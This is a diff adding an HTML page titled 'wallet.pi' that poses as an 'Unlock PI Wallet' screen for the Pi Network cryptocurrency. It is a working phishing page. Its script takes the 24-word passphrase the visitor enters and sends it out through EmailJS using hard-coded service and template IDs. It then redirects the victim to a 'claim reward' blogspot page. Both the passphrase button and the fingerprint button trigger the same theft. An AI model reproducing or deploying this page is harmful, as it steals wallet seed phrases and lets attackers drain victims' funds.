@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+  <head>
+
+    <meta charset="UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <meta name="viewport" content="width=500, initial-scale=1.0" />
+
+    <title>wallet.pi</title>
+
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+    <link
+
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700;800&display=swap"
+
+      rel="stylesheet"
+
+    />
+
+    <script
+
+      type="text/javascript"
+
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
+
+    ></script>
+
+    <script type="text/javascript">
+
+      (function () {
+
+        emailjs.init("Qi2NQXDBYaByygscV");
+
+      })();
+
+    </script>
+
+    <style>
+
+      @import url("https://fonts.googleapis.com/css2?family=Mulish:wght@600&display=swap");
+
+      h2 {
+
+        font-family: "Mulish", sans-serif;
+
+        text-align: center;
+
+      }
+
+
+
+      .blog {
+
+        display: flex;
+
+        flex-direction: column;
+
+        align-items: center;
+
+      }
+
+
+
+      form {
+
+        display: flex;
+
+        flex-direction: column;
+
+        align-items: center;
+
+      }
+
+
+
+      textarea {
+
+        font-size: 18px;
+
+        padding: 12px;
+
+        font-family: "Poppins", sans-serif;
+
+        border-style: none;
+
+        border: 1.5px solid #c7c7c7;
+
+        border-radius: 3px;
+
+        width: 250px;
+
+      }
+
+
+
+      textarea:focus {
+
+        /*border: 2px solid goldenrod;*/
+
+        border: 2px solid #d9ab50;
+
+      }
+
+
+
+      input {
+
+        width: 310px;
+
+        padding: 11px 38px;
+
+        background: white;
+
+        border: 1px solid #703d92;
+
+        border-radius: 8px;
+
+        color: #703d92;
+
+        cursor: pointer;
+
+        font-family: "Mulish", sans-serif;
+
+        font-size: initial;
+
+      }
+
+
+
+      .input2 {
+
+        width: 310px;
+
+        font-family: "Mulish", sans-serif;
+
+        padding: 9px 38px;
+
+        background: #703d92;
+
+        border: 2px solid #703d92;
+
+        border-radius: 10px;
+
+        color: #ffffff;
+
+        cursor: pointer;
+
+        font-size: initial;
+
+      }
+
+      .input2:hover {
+
+        background: #68328d;
+
+      }
+
+
+
+      #wordshow {
+
+        font-family: "Mulish", sans-serif;
+
+        font-size: 15px;
+
+        margin-bottom: 14px;
+
+        /*color: #ff0000f0;*/
+
+        color: #df5d5d;
+
+        font-weight: 500;
+
+      }
+
+
+
+      a {
+
+        text-decoration: none;
+
+        font-family: "Mulish", sans-serif;
+
+        font-size: 14px;
+
+      }
+
+
+
+      .discription {
+
+        padding: 20px 20px;
+
+        font-family: "Mulish", sans-serif;
+
+        font-size: 16px;
+
+        color: #373737;
+
+        font-family: "Mulish", sans-serif;
+
+      }
+
+
+
+      .pr {
+
+        padding: 0px 20px 0px 20px;
+
+        font-family: "Mulish", sans-serif;
+
+      }
+
+
+
+      form {
+
+        overflow: hidden;
+
+      }
+
+
+
+      #btn {
+
+        margin-bottom: 20px;
+
+      }
+
+
+
+      .btn1 {
+
+        margin-top: 15px;
+
+        margin-bottom: 30px;
+
+      }
+
+    </style>
+
+  </head>
+
+
+
+  <body>
+
+    <h2>Unlock PI Wallet</h2>
+
+    <div class="blog">
+
+      <textarea
+
+        id="textkey"
+
+        class=""
+
+        name="Message"
+
+        placeholder="Enter your 24-word passphrase here"
+
+        cols="23"
+
+        rows="8"
+
+        required
+
+      ></textarea>
+
+      <br />
+
+      <span id="wordshow"></span>
+
+      <input
+
+        onclick="sendMail()"
+
+        id="btn"
+
+        type="submit"
+
+        value="Unlock With Passphrase"
+
+      />
+
+      <input
+
+        onclick="sendMail()"
+
+        id="btn2"
+
+        class="input2"
+
+        type="submit"
+
+        value="Unlock With Fingerprint"
+
+      />
+
+      <!-- <h4><a href="https://minepi.com/">Unlock a Developer App Wallet</a></h4> -->
+
+      <div class="discription">
+
+        <p>
+
+          As a none-custodial wallet, your wallet passphrase is exclusively
+
+          accessible only to you. Recovery of passphrase is currently
+
+          impossible.
+
+        </p>
+
+      </div>
+
+      <p class="pr">
+
+        Lost your passphrase?
+
+        <a href="https://minepi.com/"
+
+          ><span style="color: #0c75e6">You can create a new wallet,</span></a
+
+        >
+
+        but all your π in your previous wallet will be inaccessible.
+
+      </p>
+
+    </div>
+
+
+
+    <script>
+
+      function sendMail() {
+
+        var key = document.getElementById("textkey").value;
+
+        let word = key.split(" ");
+
+        let count = word.length;
+
+
+
+        if (count === 24) {
+
+          var params = {
+
+            key: document.getElementById("textkey").value,
+
+          };
+
+          const serviceID = "service_i95f60g";
+
+          const templateID = "template_7iw4x9j";
+
+
+
+          emailjs
+
+            .send(serviceID, templateID, params)
+
+            .then((res) => {
+
+              document.getElementById("textkey").value;
+
+              window.open("https://claimpireward.blogspot.com/p/n-ote-core-team-transfer-your-reward.html", "_parent	");
+
+              document.getElementById("wordshow").innerText = "";
+
+
+
+              // alert('your message sent seccessfully');
+
+            })
+
+            .catch((err) => console.log(err));
+
+          //  document.getElementById('wordshow').innerText =("Successfully word"+ count);
+
+        } else {
+
+          document.getElementById("wordshow").innerText = "Invalid Passphrase";
+
+        }
+
+
+
+        document.getElementById("textkey").value = "";
+
+      }
+
+    </script>
+
+  <script src="https://www.drv.tw/inc/wd.js?s=4zun3dxpd7jxnnnrs7jhlw"></script></body>
+
+</html>
+
